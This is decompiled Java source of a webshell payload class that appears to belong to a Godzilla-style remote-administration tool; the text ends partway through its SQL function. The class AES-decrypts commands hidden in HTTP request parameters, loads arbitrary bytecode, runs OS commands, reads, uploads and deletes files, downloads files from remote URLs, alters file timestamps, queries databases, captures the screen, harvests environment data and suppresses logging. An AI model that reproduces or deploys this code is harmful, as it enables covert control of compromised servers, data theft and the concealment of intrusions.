import javax.imageio.ImageIO;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.BasicFileAttributeView;
import java.nio.file.attribute.FileTime;
import java.sql.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.*;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

//
// Decompiled by Procyon v0.5.36
//

public class payload extends ClassLoader
{
    public static final char[] toBase64;
    HashMap parameterMap;
    HashMap sessionMap;
    Object servletContext;
    Object servletRequest;
    Object servletResponse;
    Object httpSession;
    byte[] requestData;
    ByteArrayOutputStream outputStream;
    static /* synthetic */ Class class$0;
    static /* synthetic */ Class class$1;
    static /* synthetic */ Class class$2;
    static /* synthetic */ Class class$3;
    static /* synthetic */ Class class$4;
    static /* synthetic */ Class class$5;
    static /* synthetic */ Class class$6;
    static /* synthetic */ Class class$7;
    static /* synthetic */ Class class$8;
    static /* synthetic */ Class class$9;
    static /* synthetic */ Class class$10;
    String xc;//密钥
    String pass;//密码
    String md5=md5(pass+xc);
    static {
        toBase64 = new char[] { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/' };
    }



    public payload() {
        this.parameterMap = new HashMap();
    }

    public payload(final ClassLoader loader) {
        super(loader);
        this.parameterMap = new HashMap();
    }

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        }catch (Exception e) {}
        return ret;
    }
    public byte[] x(byte[] s,boolean m,String xc){  //字节码进行AES加密
        try{
            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
            c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));
            return c.doFinal(s);
        }
        catch (Exception e){return null; }
    }
    public Class g(final byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public byte[] run() {
        try {
            final String className = this.get("evalClassName");
            final String methodName = this.get("methodName");
            if (methodName == null) {
                return "method is null".getBytes();
            }
            if (className == null) {
                final Method method = this.getClass().getMethod(methodName, (Class<?>[])null);
                final Class<?> returnType = method.getReturnType();
                Class class$0;
                if ((class$0 = payload.class$0) == null) {
                    try {
                        class$0 = (payload.class$0 = Class.forName("[B"));
                    }
                    catch (ClassNotFoundException ex) {
                        throw new NoClassDefFoundError(ex.getMessage());
                    }
                }
                if (returnType.isAssignableFrom(class$0)) {
                    return (byte[])method.invoke(this, (Object[])null);
                }
                return "this method returnType not is byte[]".getBytes();
            }
            else {
                final Class evalClass = (Class) this.sessionMap.get(className);
                if (evalClass == null) {
                    return "evalClass is null".getBytes();
                }
                final Object object = evalClass.newInstance();
                object.equals(this.parameterMap);
                object.toString();
                final Object resultObject = this.parameterMap.get("result");
                if (resultObject == null) {
                    return new byte[0];
                }
                Class class$2;
                if ((class$2 = payload.class$0) == null) {
                    try {
                        class$2 = (payload.class$0 = Class.forName("[B"));
                    }
                    catch (ClassNotFoundException ex2) {
                        throw new NoClassDefFoundError(ex2.getMessage());
                    }
                }
                if (class$2.isAssignableFrom(resultObject.getClass())) {
                    return (byte[])resultObject;
                }
                return "return typeErr".getBytes();
            }
        }
        catch (Throwable e) {
            final ByteArrayOutputStream stream = new ByteArrayOutputStream();
            final PrintStream printStream = new PrintStream(stream);
            e.printStackTrace(printStream);
            printStream.flush();
            printStream.close();
            return stream.toByteArray();
        }
    }

    public void formatParameter() {
        this.parameterMap.clear();
        this.parameterMap.put("sessionMap", this.sessionMap);
        this.parameterMap.put("servletRequest", this.servletRequest);
        this.parameterMap.put("servletContext", this.servletContext);
        this.parameterMap.put("httpSession", this.httpSession);
        final byte[] parameterByte = this.requestData;
        final ByteArrayInputStream tStream = new ByteArrayInputStream(parameterByte);
        final ByteArrayOutputStream tp = new ByteArrayOutputStream();
        String key = null;
        final byte[] lenB = new byte[4];
        byte[] data = null;
        try {
            final GZIPInputStream inputStream = new GZIPInputStream(tStream);
            while (true) {
                final byte t = (byte)inputStream.read();
                if (t == -1) {
                    break;
                }
                if (t == 2) {
                    key = new String(tp.toByteArray());
                    inputStream.read(lenB);
                    final int len = bytesToInt(lenB);
                    data = new byte[len];
                    int readOneLen = 0;
                    while ((readOneLen += inputStream.read(data, readOneLen, data.length - readOneLen)) < data.length) {}
                    this.parameterMap.put(key, data);
                    tp.reset();
                }
                else {
                    tp.write(t);
                }
            }
            tp.close();
            tStream.close();
            inputStream.close();
        }
        catch (Exception ex) {}
    }

    public boolean equals(Object obj) {
        handle(obj);
        ServletRequest request = (ServletRequest) this.servletRequest;
        ServletResponse response = (ServletResponse) this.servletResponse;
        try{
            byte[] data = base64Decode(request.getParameter(this.pass));
            data = x(data,false,xc);
            java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();
            handle(arrOut);
            this.noLog(this.servletContext);
            handle(data);
            this.noLog(this.servletContext);
            response.getWriter().write(this.md5.substring(0,16));
            this.toString();
            response.getWriter().write(base64Encode(x(arrOut.toByteArray(),true,xc)));
            response.getWriter().write(this.md5.substring(16));
        }catch (Throwable throwable){}
        return true;
    }

    public boolean handle( Object obj) {
        if (obj == null) {
            return false;
        }
        Class class$1;
        if ((class$1 = payload.class$1) == null) {
            try {
                class$1 = (payload.class$1 = Class.forName("java.io.ByteArrayOutputStream"));
            }
            catch (ClassNotFoundException ex) {
                throw new NoClassDefFoundError(ex.getMessage());
            }
        }
        if (class$1.isAssignableFrom(obj.getClass())) {
            this.outputStream = (ByteArrayOutputStream)obj;
            return false;
        }
        if (this.supportClass(obj, "%s.servlet.http.HttpServletRequest")) {
            this.servletRequest = obj;
        }
        else if (this.supportClass(obj, "%s.servlet.ServletRequest")) {
            this.servletRequest = obj;
        }
        else {
            Class class$2;
            if ((class$2 = payload.class$0) == null) {
                try {
                    class$2 = (payload.class$0 = Class.forName("[B"));
                }
                catch (ClassNotFoundException ex2) {
                    throw new NoClassDefFoundError(ex2.getMessage());
                }
            }
            if (class$2.isAssignableFrom(obj.getClass())) {
                this.requestData = (byte[])obj;
            }
            else if (this.supportClass(obj, "%s.servlet.http.HttpSession")) {
                this.httpSession = obj;
            }
        }
        this.handlePayloadContext(obj);
        if (this.servletRequest != null && this.requestData == null) {
            final Object servletRequest = this.servletRequest;
            final String methodName = "getAttribute";
            final Class[] parameterClass = { null };
            final int n = 0;
            Class class$3;
            if ((class$3 = payload.class$2) == null) {
                try {
                    class$3 = (payload.class$2 = Class.forName("java.lang.String"));
                }
                catch (ClassNotFoundException ex3) {
                    throw new NoClassDefFoundError(ex3.getMessage());
                }
            }
            parameterClass[n] = class$3;
            final Object retVObject = this.getMethodAndInvoke(servletRequest, methodName, parameterClass, new Object[] { "parameters" });
            if (retVObject != null) {
                Class class$4;
                if ((class$4 = payload.class$0) == null) {
                    try {
                        class$4 = (payload.class$0 = Class.forName("[B"));
                    }
                    catch (ClassNotFoundException ex4) {
                        throw new NoClassDefFoundError(ex4.getMessage());
                    }
                }
                if (class$4.isAssignableFrom(retVObject.getClass())) {
                    this.requestData = (byte[])retVObject;
                }
            }
        }
        return true;
    }

    private void handlePayloadContext( Object obj) {
        try {
            if (Object[].class.isAssignableFrom(obj.getClass())){
                Object[] objects = (Object[]) obj;
                this.servletRequest = objects[0];
                this.servletContext = getMethodAndInvoke(objects[0],"getServletContext",null,null);
                this.servletResponse = objects[1];
                this.httpSession = objects[2];
            } else if (obj.getClass().getName().indexOf("PageContext")>=0) {
                final Method getRequestMethod = this.getMethodByClass(obj.getClass(), "getRequest", null);
                final Method getServletContextMethod = this.getMethodByClass(obj.getClass(), "getServletContext", null);
                final Method getSessionMethod = this.getMethodByClass(obj.getClass(), "getSession", null);
                final Method getResponseMethod = this.getMethodByClass(obj.getClass(), "getResponse", null);
                if (getRequestMethod != null && this.servletRequest == null) {
                    this.servletRequest = getRequestMethod.invoke(obj, (Object[])null);
                }
                if (getServletContextMethod != null && this.servletContext == null) {
                    this.servletContext = getServletContextMethod.invoke(obj, (Object[])null);
                }
                if (getSessionMethod != null && this.httpSession == null) {
                    this.httpSession = getSessionMethod.invoke(obj, (Object[])null);
                }
                if (getResponseMethod != null && this.servletResponse == null){
                    this.servletResponse = getResponseMethod.invoke(obj,(Object[])null);
                }
            }else {
                Map<String,Object> objectMap = (Map) obj;
                this.servletRequest = objectMap.get("request");
                this.servletContext = getMethodAndInvoke(this.servletRequest,"getServletContext",null,null);
                this.servletResponse = objectMap.get("response");
                this.httpSession = objectMap.get("session");
            }
        }
        catch (Exception ex) {}
    }

    private boolean supportClass( Object obj,  String classNameString) {
        if (obj == null) {
            return false;
        }
        boolean ret = false;
        Class c = null;
        try {
            if ((c = getClass(String.format(classNameString, "javax"))) != null) {
                ret = c.isAssignableFrom(obj.getClass());
            }
            if (!ret && (c = getClass(String.format(classNameString, "jakarta"))) != null) {
                ret = c.isAssignableFrom(obj.getClass());
            }
        }
        catch (Exception ex) {}
        return ret;
    }

    public String toString() {
        String returnString = null;
        if (this.outputStream != null) {
            try {
                this.initSessionMap();
                final GZIPOutputStream gzipOutputStream = new GZIPOutputStream(this.outputStream);
                this.formatParameter();
                if (this.parameterMap.get("evalNextData") != null) {
                    this.run();
                    this.requestData = (byte[]) this.parameterMap.get("evalNextData");
                    this.formatParameter();
                }
                gzipOutputStream.write(this.run());
                gzipOutputStream.close();
                this.outputStream.close();
            }
            catch (Throwable e) {
                returnString = e.getMessage();
            }
        }
        else {
            returnString = "outputStream is null";
        }
        this.httpSession = null;
        this.outputStream = null;
        this.parameterMap = null;
        this.requestData = null;
        this.servletContext = null;
        this.servletRequest = null;
        this.sessionMap = null;
        return returnString;
    }

    private void initSessionMap() {
        if (this.sessionMap == null) {
            if (this.getSessionAttribute("sessionMap") != null) {
                try {
                    this.sessionMap = (HashMap)this.getSessionAttribute("sessionMap");
                }
                catch (Exception ex) {}
            }
            else {
                this.sessionMap = new HashMap();
                try {
                    this.setSessionAttribute("sessionMap", this.sessionMap);
                }
                catch (Exception ex2) {}
            }
            if (this.sessionMap == null) {
                this.sessionMap = new HashMap();
            }
        }
    }

    public String get( String key) {
        try {
            return new String((byte[]) this.parameterMap.get(key));
        }
        catch (Exception e) {
            return null;
        }
    }

    public byte[] getByteArray( String key) {
        try {
            return (byte[]) this.parameterMap.get(key);
        }
        catch (Exception e) {
            return null;
        }
    }

    public byte[] test() {
        return "ok".getBytes();
    }

    public byte[] getFile() {
        String dirName = this.get("dirName");
        if (dirName != null) {
            dirName = dirName.trim();
            String buffer = new String();
            try {
                final String currentDir = new File(dirName).getAbsoluteFile() + "/";
                final File currentDirFile = new File(currentDir);
                if (!currentDirFile.exists()) {
                    return "dir does not exist".getBytes();
                }
                final File[] files = currentDirFile.listFiles();
                buffer = String.valueOf(buffer) + "ok";
                buffer = String.valueOf(buffer) + "\n";
                buffer = String.valueOf(buffer) + currentDir;
                buffer = String.valueOf(buffer) + "\n";
                if (files != null) {
                    for (int i = 0; i < files.length; ++i) {
                        final File file = files[i];
                        try {
                            buffer = String.valueOf(buffer) + file.getName();
                            buffer = String.valueOf(buffer) + "\t";
                            buffer = String.valueOf(buffer) + (file.isDirectory() ? "0" : "1");
                            buffer = String.valueOf(buffer) + "\t";
                            buffer = String.valueOf(buffer) + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(file.lastModified()));
                            buffer = String.valueOf(buffer) + "\t";
                            buffer = String.valueOf(buffer) + Integer.toString((int)file.length());
                            buffer = String.valueOf(buffer) + "\t";
                            final StringBuffer append = new StringBuffer(String.valueOf(file.canRead() ? "R" : "")).append(file.canWrite() ? "W" : "");
                            Class class$3;
                            if ((class$3 = payload.class$3) == null) {
                                try {
                                    class$3 = (payload.class$3 = Class.forName("java.io.File"));
                                }
                                catch (ClassNotFoundException ex) {
                                    throw new NoClassDefFoundError(ex.getMessage());
                                }
                            }
                            final String fileState = append.append((this.getMethodByClass(class$3, "canExecute", null) != null) ? (file.canExecute() ? "X" : "") : "").toString();
                            buffer = String.valueOf(buffer) + ((fileState == null || fileState.trim().length() == 0) ? "F" : fileState);
                            buffer = String.valueOf(buffer) + "\n";
                        }
                        catch (Exception e) {
                            buffer = String.valueOf(buffer) + e.getMessage();
                            buffer = String.valueOf(buffer) + "\n";
                        }
                    }
                }
            }
            catch (Exception e2) {
                return String.format("dir does not exist errMsg:%s", e2.getMessage()).getBytes();
            }
            return buffer.getBytes();
        }
        return "No parameter dirName".getBytes();
    }

    public String listFileRoot() {
        final File[] files = File.listRoots();
        String buffer = new String();
        for (int i = 0; i < files.length; ++i) {
            buffer = String.valueOf(buffer) + files[i].getPath();
            buffer = String.valueOf(buffer) + ";";
        }
        return buffer;
    }

    public byte[] fileRemoteDown() {
        final String url = this.get("url");
        final String saveFile = this.get("saveFile");
        if (url != null && saveFile != null) {
            FileOutputStream outputStream = null;
            try {
                final InputStream inputStream = new URL(url).openStream();
                outputStream = new FileOutputStream(saveFile);
                final byte[] data = new byte[5120];
                int readNum = -1;
                while ((readNum = inputStream.read(data)) != -1) {
                    outputStream.write(data, 0, readNum);
                }
                outputStream.flush();
                outputStream.close();
                inputStream.close();
                return "ok".getBytes();
            }
            catch (Exception e2) {
                if (outputStream != null) {
                    try {
                        outputStream.close();
                    }
                    catch (IOException e1) {
                        return e1.getMessage().getBytes();
                    }
                }
                return String.format("%s : %s", e2.getClass().getName(), e2.getMessage()).getBytes();
            }
        }
        return "url or saveFile is null".getBytes();
    }

    public byte[] setFileAttr() {
        final String type = this.get("type");
        final String attr = this.get("attr");
        final String fileName = this.get("fileName");
        String ret = "Null";
        if (type != null && attr != null && fileName != null) {
            try {
                final File file = new File(fileName);
                if ("fileBasicAttr".equals(type)) {
                    Class class$3;
                    if ((class$3 = payload.class$3) == null) {
                        try {
                            class$3 = (payload.class$3 = Class.forName("java.io.File"));
                        }
                        catch (ClassNotFoundException ex) {
                            throw new NoClassDefFoundError(ex.getMessage());
                        }
                    }
                    if (this.getMethodByClass(class$3, "setWritable", new Class[] { Boolean.TYPE }) != null) {
                        if (attr.indexOf("R") != -1) {
                            file.setReadable(true);
                        }
                        if (attr.indexOf("W") != -1) {
                            file.setWritable(true);
                        }
                        if (attr.indexOf("X") != -1) {
                            file.setExecutable(true);
                        }
                        ret = "ok";
                        return ret.getBytes();
                    }
                    ret = "Java version is less than 1.6";
                    return ret.getBytes();
                }
                else {
                    if (!"fileTimeAttr".equals(type)) {
                        ret = "no ExcuteType";
                        return ret.getBytes();
                    }
                    Class class$4;
                    if ((class$4 = payload.class$3) == null) {
                        try {
                            class$4 = (payload.class$3 = Class.forName("java.io.File"));
                        }
                        catch (ClassNotFoundException ex2) {
                            throw new NoClassDefFoundError(ex2.getMessage());
                        }
                    }
                    if (this.getMethodByClass(class$4, "setLastModified", new Class[] { Long.TYPE }) != null) {
                        Date date = new Date(0L);
                        final StringBuilder builder = new StringBuilder();
                        builder.append(attr);
                        final char[] cs = new char[13 - builder.length()];
                        Arrays.fill(cs, '0');
                        builder.append(cs);
                        date = new Date(date.getTime() + Long.parseLong(builder.toString()));
                        file.setLastModified(date.getTime());
                        ret = "ok";
                        try {
                            final Class nioFile = Class.forName("java.nio.file.Paths");
                            final Class basicFileAttributeViewClass = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                            final Class filesClass = Class.forName("java.nio.file.Files");
                            if (nioFile != null && basicFileAttributeViewClass != null && filesClass != null) {
                                final Path value = Paths.get(fileName, new String[0]);
                                Class class$5;
                                if ((class$5 = payload.class$4) == null) {
                                    try {
                                        class$5 = (payload.class$4 = Class.forName("java.nio.file.attribute.BasicFileAttributeView"));
                                    }
                                    catch (ClassNotFoundException ex3) {
                                        throw new NoClassDefFoundError(ex3.getMessage());
                                    }
                                }
                                final BasicFileAttributeView attributeView = Files.getFileAttributeView(value, (Class<BasicFileAttributeView>)class$5, new LinkOption[0]);
                                attributeView.setTimes(FileTime.fromMillis(date.getTime()), FileTime.fromMillis(date.getTime()), FileTime.fromMillis(date.getTime()));
                            }
                        }
                        catch (Exception ex4) {}
                        return ret.getBytes();
                    }
                    ret = "Java version is less than 1.2";
                    return ret.getBytes();
                }
            }
            catch (Exception e) {
                return String.format("Exception errMsg:%s", e.getMessage()).getBytes();
            }
        }
        ret = "type or attr or fileName is null";
        return ret.getBytes();
    }

    public byte[] readFile() {
        final String fileName = this.get("fileName");
        if (fileName != null) {
            final File file = new File(fileName);
            try {
                if (file.exists() && file.isFile()) {
                    byte[] data = new byte[(int)file.length()];
                    if (data.length > 0) {
                        int readOneLen = 0;
                        final FileInputStream fileInputStream = new FileInputStream(file);
                        while ((readOneLen += fileInputStream.read(data, readOneLen, data.length - readOneLen)) < data.length) {}
                        fileInputStream.close();
                    }
                    else {
                        byte[] temData = new byte[3145728];
                        final FileInputStream fileInputStream = new FileInputStream(file);
                        final int readLen = fileInputStream.read(temData);
                        if (readLen > 0) {
                            data = new byte[readLen];
                            System.arraycopy(temData, 0, data, 0, data.length);
                        }
                        fileInputStream.close();
                        temData = null;
                    }
                    return data;
                }
                return "file does not exist".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName".getBytes();
    }

    public byte[] uploadFile() {
        final String fileName = this.get("fileName");
        final byte[] fileValue = this.getByteArray("fileValue");
        if (fileName != null && fileValue != null) {
            try {
                final File file = new File(fileName);
                file.createNewFile();
                final FileOutputStream fileOutputStream = new FileOutputStream(file);
                fileOutputStream.write(fileValue);
                fileOutputStream.close();
                return "ok".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName and fileValue".getBytes();
    }

    public byte[] newFile() {
        final String fileName = this.get("fileName");
        if (fileName != null) {
            final File file = new File(fileName);
            try {
                if (file.createNewFile()) {
                    return "ok".getBytes();
                }
                return "fail".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName".getBytes();
    }

    public byte[] newDir() {
        final String dirName = this.get("dirName");
        if (dirName != null) {
            final File file = new File(dirName);
            try {
                if (file.mkdirs()) {
                    return "ok".getBytes();
                }
                return "fail".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName".getBytes();
    }

    public byte[] deleteFile() {
        final String dirName = this.get("fileName");
        if (dirName != null) {
            try {
                final File file = new File(dirName);
                this.deleteFiles(file);
                return "ok".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName".getBytes();
    }

    public byte[] moveFile() {
        final String srcFileName = this.get("srcFileName");
        final String destFileName = this.get("destFileName");
        if (srcFileName != null && destFileName != null) {
            final File file = new File(srcFileName);
            try {
                if (!file.exists()) {
                    return "The target does not exist".getBytes();
                }
                if (file.renameTo(new File(destFileName))) {
                    return "ok".getBytes();
                }
                return "fail".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter srcFileName,destFileName".getBytes();
    }

    public byte[] copyFile() {
        final String srcFileName = this.get("srcFileName");
        final String destFileName = this.get("destFileName");
        if (srcFileName != null && destFileName != null) {
            final File srcFile = new File(srcFileName);
            final File destFile = new File(destFileName);
            try {
                if (srcFile.exists() && srcFile.isFile()) {
                    final FileInputStream fileInputStream = new FileInputStream(srcFile);
                    final FileOutputStream fileOutputStream = new FileOutputStream(destFile);
                    final byte[] data = new byte[5120];
                    int readNum = 0;
                    while ((readNum = fileInputStream.read(data)) > -1) {
                        fileOutputStream.write(data, 0, readNum);
                    }
                    fileInputStream.close();
                    fileOutputStream.close();
                    return "ok".getBytes();
                }
                return "The target does not exist or is not a file".getBytes();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter srcFileName,destFileName".getBytes();
    }

    public byte[] include() {
        final byte[] binCode = this.getByteArray("binCode");
        final String className = this.get("codeName");
        if (binCode != null && className != null) {
            try {
                final payload payload = new payload(this.getClass().getClassLoader());
                final Class module = payload.g(binCode);
                this.sessionMap.put(className, module);
                return "ok".getBytes();
            }
            catch (Exception e) {
                if (this.sessionMap.get(className) != null) {
                    return "ok".getBytes();
                }
                return e.getMessage().getBytes();
            }
        }
        return "No parameter binCode,codeName".getBytes();
    }

    public Object getSessionAttribute(final String keyString) {
        if (this.httpSession != null) {
            final Object httpSession = this.httpSession;
            final String methodName = "getAttribute";
            final Class[] parameterClass = { null };
            final int n = 0;
            Class class$2;
            if ((class$2 = payload.class$2) == null) {
                try {
                    class$2 = (payload.class$2 = Class.forName("java.lang.String"));
                }
                catch (ClassNotFoundException ex) {
                    throw new NoClassDefFoundError(ex.getMessage());
                }
            }
            parameterClass[n] = class$2;
            return this.getMethodAndInvoke(httpSession, methodName, parameterClass, new Object[] { keyString });
        }
        return null;
    }

    public void setSessionAttribute( String keyString,  Object value) {
        if (this.httpSession != null) {
            final Object httpSession = this.httpSession;
            final String methodName = "setAttribute";
            final Class[] parameterClass = new Class[2];
            final int n = 0;
            Class class$2;
            if ((class$2 = payload.class$2) == null) {
                try {
                    class$2 = (payload.class$2 = Class.forName("java.lang.String"));
                }
                catch (ClassNotFoundException ex) {
                    throw new NoClassDefFoundError(ex.getMessage());
                }
            }
            parameterClass[n] = class$2;
            final int n2 = 1;
            Class class$3;
            if ((class$3 = payload.class$5) == null) {
                try {
                    class$3 = (payload.class$5 = Class.forName("java.lang.Object"));
                }
                catch (ClassNotFoundException ex2) {
                    throw new NoClassDefFoundError(ex2.getMessage());
                }
            }
            parameterClass[n2] = class$3;
            this.getMethodAndInvoke(httpSession, methodName, parameterClass, new Object[] { keyString, value });
        }
    }

    public byte[] execCommand() {
        final String argsCountStr = this.get("argsCount");
        if (argsCountStr != null && argsCountStr.length() > 0) {
            try {
                Process process = null;
                final ArrayList argsList = new ArrayList();
                final int argsCount = Integer.parseInt(argsCountStr);
                if (argsCount <= 0) {
                    return "argsCount <=0".getBytes();
                }
                for (int i = 0; i < argsCount; ++i) {
                    final String val = this.get(String.format("arg-%d", new Integer(i)));
                    if (val != null) {
                        argsList.add(val);
                    }
                }
                final String[] cmdarray = new String[argsList.size()];
                for (int j = 0; j < argsList.size(); ++j) {
                    cmdarray[j] = (String) argsList.get(j);
                }
                process = Runtime.getRuntime().exec((String[]) argsList.toArray(new String[0]));
                if (process == null) {
                    return "Unable to start process".getBytes();
                }
                final InputStream inputStream = process.getInputStream();
                final InputStream errorInputStream = process.getErrorStream();
                final ByteArrayOutputStream memStream = new ByteArrayOutputStream(1024);
                final byte[] buff = new byte[521];
                int readNum = 0;
                if (inputStream != null) {
                    while ((readNum = inputStream.read(buff)) > 0) {
                        memStream.write(buff, 0, readNum);
                    }
                }
                if (errorInputStream != null) {
                    while ((readNum = errorInputStream.read(buff)) > 0) {
                        memStream.write(buff, 0, readNum);
                    }
                }
                return memStream.toByteArray();
            }
            catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter argsCountStr".getBytes();
    }

    public byte[] getBasicsInfo() {
        try {
            final Enumeration keys = System.getProperties().keys();
            String basicsInfo = new String();
            basicsInfo = String.valueOf(basicsInfo) + "FileRoot : " + this.listFileRoot() + "\n";
            basicsInfo = String.valueOf(basicsInfo) + "CurrentDir : " + new File("").getAbsoluteFile() + "/" + "\n";
            basicsInfo = String.valueOf(basicsInfo) + "CurrentUser : " + System.getProperty("user.name") + "\n";
            basicsInfo = String.valueOf(basicsInfo) + "ProcessArch : " + System.getProperty("sun.arch.data.model") + "\n";
            try {
                String tmpdir = System.getProperty("java.io.tmpdir");
                final char lastChar = tmpdir.charAt(tmpdir.length() - 1);
                if (lastChar != '\\' && lastChar != '/') {
                    tmpdir = String.valueOf(tmpdir) + File.separator;
                }
                basicsInfo = String.valueOf(basicsInfo) + "TempDirectory : " + tmpdir + "\n";
            }
            catch (Exception ex) {}
            basicsInfo = String.valueOf(basicsInfo) + "DocBase : " + this.getDocBase() + "\n";
            basicsInfo = String.valueOf(basicsInfo) + "RealFile : " + this.getRealPath() + "\n";
            basicsInfo = String.valueOf(basicsInfo) + "servletRequest : " + ((this.servletRequest == null) ? "null" : (String.valueOf(String.valueOf(this.servletRequest.hashCode())) + "\n"));
            basicsInfo = String.valueOf(basicsInfo) + "servletContext : " + ((this.servletContext == null) ? "null" : (String.valueOf(String.valueOf(this.servletContext.hashCode())) + "\n"));
            basicsInfo = String.valueOf(basicsInfo) + "httpSession : " + ((this.httpSession == null) ? "null" : (String.valueOf(String.valueOf(this.httpSession.hashCode())) + "\n"));
            try {
                basicsInfo = String.valueOf(basicsInfo) + "OsInfo : " + String.format("os.name: %s os.version: %s os.arch: %s", System.getProperty("os.name"), System.getProperty("os.version"), System.getProperty("os.arch")) + "\n";
            }
            catch (Exception e) {
                basicsInfo = String.valueOf(basicsInfo) + "OsInfo : " + e.getMessage() + "\n";
            }
            basicsInfo = String.valueOf(basicsInfo) + "IPList : " + getLocalIPList() + "\n";
            while (keys.hasMoreElements()) {
                final Object object = keys.nextElement();
                if (object instanceof String) {
                    final String key = (String)object;
                    basicsInfo = String.valueOf(basicsInfo) + key + " : " + System.getProperty(key) + "\n";
                }
            }
            final Map envMap = this.getEnv();
            if (envMap != null) {
                Iterator iterator = envMap.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = (String) iterator.next();
                    basicsInfo = String.valueOf(basicsInfo) + key + " : " + envMap.get(key) + "\n";
                }
            }
            return basicsInfo.getBytes();
        }
        catch (Exception e2) {
            return e2.getMessage().getBytes();
        }
    }

    public byte[] screen() {
        try {
            final Robot robot = new Robot();
            final BufferedImage as = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit.getDefaultToolkit().getScreenSize().height));
            final ByteArrayOutputStream bs = new ByteArrayOutputStream();
            ImageIO.write(as, "png", ImageIO.createImageOutputStream(bs));
            final byte[] data = bs.toByteArray();
            bs.close();
            return data;
        }
        catch (Exception e) {
            return e.getMessage().getBytes();
        }
    }

    public byte[] execSql() throws Exception {
        final String charset = this.get("dbCharset");
        final String dbType = this.get("dbType");
        final String dbHost = this.get("dbHost");
        final String dbPort = this.get("dbPort");
        final String dbUsername = this.get("dbUsername");
        final String dbPassword = this.get("dbPassword");
        final String execType = this.get("execType");
        final String execSql = new String(this.getByteArray("execSql"), charset);
        if (dbType != null && dbHost != null && dbPort != null && dbUsername != null && dbPassword != null && execType != null && execSql != null) {
            try {
                try {
                    Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
                }
                catch (Exception ex) {}
                try {
                    Class.forName("oracle.jdbc.driver.OracleDriver");
                }
                catch (Exception e2) {
                    try {
                        Class.forName("oracle.jdbc.OracleDriver");
                    }
                    catch (Exception ex2) {}
                }
                try {
                    Class.forName("com.mysql.cj.jdbc.Driver");
                }
                catch (Exception e2) {
                    try {
                        Class.forName("com.mysql.jdbc.Driver");
                    }
                    catch (Exception ex3) {}
                }
                try {
                    Class.forName("org.postgresql.Driver");
                }
                catch (Exception ex4) {}
                try {
                    Class.forName("org.sqlite.JDBC");
                }
                catch (Exception ex5) {}
                String connectUrl = null;
                if ("mysql".equals(dbType)) {
                    connectUrl = "jdbc:mysql://" + dbHost + ":" + dbPort + "/" + "?useSSL=false&serverTimezone=UTC&zeroDateTimeBehavior=convertToNull&noDatetimeStringSync=true&characterEncoding=utf-8";
                }
                else if ("oracle".equals(dbType)) {
                    connectUrl = "jdbc:oracle:thin:@" + dbHost + ":" + dbPort + ":orcl";
                }
                else if ("sqlserver".equals(dbType)) {
                    connectUrl = "jdbc:sqlserver://" + dbHost + ":" + dbPort + ";";
                }
                else if ("postgresql".equals(dbType)) {
                    connectUrl = "jdbc:postgresql://" + dbHost + ":" + dbPort + "/";
                }
                else if ("sqlite".equals(dbType)) {
                    connectUrl = "jdbc:sqlite:" + dbHost;
                }
                if (dbHost.indexOf("jdbc:") != -1) {
                    connectUrl = dbHost;
                }
                if (connectUrl != null) {
                    try {
                        Connection dbConn = null;
                        try {
                            dbConn = getConnection(connectUrl, dbUsername, dbPassword);
                        }
                        catch (Exception ex6) {}
                        if (dbConn == null) {
                            dbConn = DriverManager.getConnection(connectUrl, dbUsername, dbPassword);
                        }
                        final Statement statement = dbConn.createStatement();
                        if (execType.equals("select")) {
                            String data = "ok\n";
                            final ResultSet resultSet = statement.executeQuery(execSql);
                            final ResultSetMetaData metaData = resultSet.getMetaData();
                            final int columnNum = metaData.getColumnCount();
                            for (int i = 0; i < columnNum; ++i) {
                                data = String.valueOf(data) + this.base64Encode(String.format("%s", metaData.getColumnName(i + 1))) + "\t";
                            }
                            data = String.valueOf(data) + "\n";
                            while (resultSet.next()) {
                                for (int i = 0; i < columnNum; ++i) {
                                    data = String.valueOf(data) + this.base64Encode(String.format("%s", resultSet.getString(i + 1))) + "\t";
                                }
                                data = String.valueOf(data) + "\n";
                            }
                            resultSet.close();
                            statement.close();
                            dbConn.close();
                            return data.getBytes();
                        }
                        final int affectedNum = statement.executeUpdate(execSql);
